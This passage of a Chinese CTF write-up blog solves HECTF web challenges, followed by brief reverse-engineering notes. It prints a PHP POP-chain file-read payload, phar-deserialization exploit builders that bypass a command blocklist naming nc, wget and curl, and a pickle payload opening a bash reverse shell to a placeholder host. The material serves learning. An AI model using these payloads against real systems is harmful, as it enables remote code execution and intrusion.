urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;SplFileObject&#x27;</span></span><br><span class="line">    private_ext = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/ffflllllaaaaaaggggg.txt&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = D()</span><br><span class="line">    public_eee = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_huang = C()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">D</span>:</span><br><span class="line">    private_ddd = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    private_ext = B()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">C</span>:</span><br><span class="line">    public_ccc = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    public_eee = D()</span><br><span class="line">    public_aaa = <span class="string">&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_str = C()</span><br><span class="line">    public_huang = <span class="string">&#x27;?&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_file = B()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(quote(serialize(A())))</span><br><span class="line"></span><br><span class="line"><span class="comment"># POST payload</span></span><br><span class="line"><span class="comment"># data = O%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22file%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22str%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22eee%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A1%3A%22%3F%22%3Bs%3A6%3A%22%00D%00ext%22%3BO%3A1%3A%22B%22%3A2%3A%7Bs%3A5%3A%22huang%22%3BO%3A1%3A%22C%22%3A3%3A%7Bs%3A3%3A%22aaa%22%3Bs%3A1%3A%22%3F%22%3Bs%3A3%3A%22ccc%22%3BO%3A1%3A%22D%22%3A2%3A%7Bs%3A6%3A%22%00D%00ddd%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A6%3A%22%00D%00ext%22%3Bs%3A73%3A%22php%3A//filter/read%3Dconvert.base64-encode/resource%3D/ffflllllaaaaaaggggg.txt%22%3B%7Ds%3A3%3A%22eee%22%3Bs%3A1%3A%22%3F%22%3B%7Ds%3A3%3A%22str%22%3Bs%3A1%3A%22%3F%22%3B%7D%7D%7D%7D%7D</span></span><br><span class="line"><span class="comment"># HECTF&#123;u_find_m</span></span><br><span class="line"><span class="comment"># y_trulyself&#125;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h3><p>观察页面，有图片上传点，url发现存在文件包含，利用伪协议读源码：</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;FROM_INDEX&#x27;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]) ? <span class="string">&#x27;home&#x27;</span> : <span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_string</span>(<span class="variable">$show</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\./&#x27;</span>, <span class="variable">$show</span>) || <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/zip/i&#x27;</span>,<span class="variable">$show</span>))</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Not this !!!&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ob_start</span>(<span class="string">&#x27;ob_gzhandler&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">page_tshow</span>(<span class="params"><span class="variable">$show</span></span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div id=<span class="string">&quot;header&quot;</span>&gt;</span><br><span class="line">&lt;center&gt;&lt;a href=<span class="string">&quot;?show=home&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">logo</span>&quot;&gt;&lt;<span class="title">img</span> <span class="title">src</span>=&quot;<span class="title">images</span>/<span class="title">logo</span>.<span class="title">jpg</span>&quot; <span class="title">alt</span>=&quot;&quot;&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">id</span>=&quot;<span class="title">body</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">fatal</span>($<span class="title">msg</span>) </span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span>&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">h2</span>&gt;<span class="title">Error</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">p</span>&gt;&lt;?=$<span class="title">msg</span>;?&gt;&lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">exit</span>(1);</span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">page_tshow</span>($<span class="title">show</span>);</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">if</span>(!(<span class="title">include</span> $<span class="title">show</span> . &#x27;.<span class="title">php</span>&#x27;))</span></span><br><span class="line"><span class="class">    <span class="title">fatal</span>(&#x27;<span class="title">no</span> <span class="title">no</span> <span class="title">no</span>&#x27;);</span></span><br><span class="line"><span class="class"><span class="title">if</span>(<span class="title">isset</span>($<span class="title">file</span>))</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>))</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;surely exists&quot;</span>;</span><br><span class="line">    <span class="keyword">else</span>   </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$file</span>.<span class="string">&quot;dont exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>home.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Welcome</span> <span class="title">to</span> <span class="title">HECTF</span> ！！！&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="title">Click</span> <span class="title">here</span> <span class="title">to</span> <span class="title">upload</span> <span class="title">your</span> <span class="title">file</span> =&gt; &lt;<span class="title">a</span> <span class="title">href</span>=&quot;?<span class="title">show</span>=<span class="title">upload</span>&quot;&gt;传送门&lt;/<span class="title">a</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">p</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;common.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$fn</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$ft</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$fn</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&#x27;uploaded file corrupted&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$array</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/png&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$ft</span>,<span class="variable">$array</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&quot;No, I want png picture ᵕ᷄ι ̠ᵕ᷅&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$imagekey</span> = <span class="title function_ invoke__">create_image_key</span>();</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$fn</span>, <span class="string">&quot;uploads/<span class="subst">$imagekey</span>.png&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: ?show=show&amp;imagekey=<span class="subst">$imagekey</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">article</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;<span class="title">Plz</span> <span class="title">Give</span> <span class="title">me</span> <span class="title">a</span> <span class="title">file</span> <span class="title">I</span> <span class="title">want</span>.&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">action</span>=&quot;?<span class="title">show</span>=<span class="title">upload</span>&quot; <span class="title">method</span>=&quot;<span class="title">POST</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">image</span>&quot;&gt;ᵕ᷄ι ̠ᵕ᷅    </span></span><br><span class="line"><span class="class"> &lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">image</span>&quot; <span class="title">name</span>=&quot;<span class="title">image</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">br</span> /&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Upload</span>&quot; /&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">center</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;FROM_INDEX&#x27;</span>)) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;MAX_IM_SIZE&#x27;</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">create_image_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">sha1</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>] . <span class="title function_ invoke__">time</span>() . <span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">load_image</span>(<span class="params"><span class="variable">$imagekey</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">1</span> !== <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9a-f]&#123;40&#125;/&#x27;</span>, <span class="variable">$imagekey</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&#x27;Invalid image key.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="string">&quot;uploads/<span class="subst">&#123;$imagekey&#125;</span>.png&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$im</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">fatal</span>(<span class="string">&#x27;Failed to load image.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$im</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>( <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[0-9]/&#x27;</span>,<span class="variable">$this</span>-&gt;hectf) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;hectf))</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;cmd))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;No no no no no!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计源码，图片上传点+<code>file_exists()</code>函数+自定义<code>HeCTF</code>类，判断为文件上传+phar反序列化利用。</p><p><code>HeCTF</code>类中RCE使用 <code>tee</code> 命令绕过过滤写文件。</p><p>构造phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">HeCTF</span>();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;ls / | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>将生成的phar文件改为png后缀上传，在index.php以POST方式传入file值，利用phar伪协议反序列化RCE：</p><p><code>POST: file=phar://uploads/25c3a34d93227241d5dacc8eb84a80ef2aabeab1.png</code></p><p>读到flag文件名 <code>/ffflllllaaaaggg</code>，同样操作构造读flag内容的phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HeCTF</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hectf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">HeCTF</span>();   </span><br><span class="line"><span class="variable">$o</span>-&gt;hectf = <span class="keyword">array</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;cmd = <span class="string">&#x27;cat /ffflllllaaaaggg | tee 1&#x27;</span>;</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="皮扣的商店"><a href="#皮扣的商店" class="headerlink" title="皮扣的商店"></a>皮扣的商店</h3><p>进入页面发现可以点击按钮，但是没钱可用，点击时发现cookie是变化的。</p><p>cookie像base64，解码，结合题目可知为json的pickle序列化结果，反推一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(b64decode(enc)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;&#x27;money&#x27;: 500, &#x27;history&#x27;: [], &#x27;anti_tamper_hmac&#x27;: &#x27;aa1ba4de55048cf20e0a7a63b7f8eb62&#x27;&#125;</span></span><br></pre></td></tr></table></figure><p>可见使用了hmac哈希，无法爆破，但可以构造RCE代码序列化后放入cookie，点击按钮执行恶意代码，由于页面无结果回显，构造反弹shell代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>, (<span class="string">&quot;bash -c \&quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1\&quot;&quot;</span>,))</span><br><span class="line">a = A()</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(pickle.dumps(a)))</span><br></pre></td></tr></table></figure><p>替换cookie后，点击按钮即可在vps getshell拿flag。</p><p>​    </p><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="贝斯"><a href="#贝斯" class="headerlink" title="贝斯"></a>贝斯</h3><p>变表base32，Cyberchef一把梭得到flag。</p><p>​    </p><h3 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h3><blockquote><p>如何分析Apk呢</p></blockquote><p>用jadx打开apk，在AndroidManifest.xml里发现：</p><p><code>&lt;meta-data android:name=&quot;父拉哥&quot; android:value=&quot;付拉哥头&#123;Apktool_or_jadx&#125;&quot;/&gt;</code></p><p>flag：<code>HECTF&#123;Apktool_or_jadx&#125;</code></p><p>​    </p><h3 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h3><blockquote><p>简单的ios</p></blockquote><p>找到关键加密函数，简单异或还原flag。</p><p>​    </p><h3 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h3><blockquote><p>easy reverse</p></blockquote><p>加密逻辑很难看，利用IDA的findcrypt插件可以识别出存在SM4加密算法的关键参数数组。</p><p>利用动调找到SM4加密使用的128位key值，导出hex：<code>AD763B4FCDCFD9251089FB0408A45F80</code>，以及128bit密文，导出hex：<code>D75CDA22176DD392A1A570915F66A61C</code>。</p><p>找一个SM4算法的python脚本解密得到flag：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 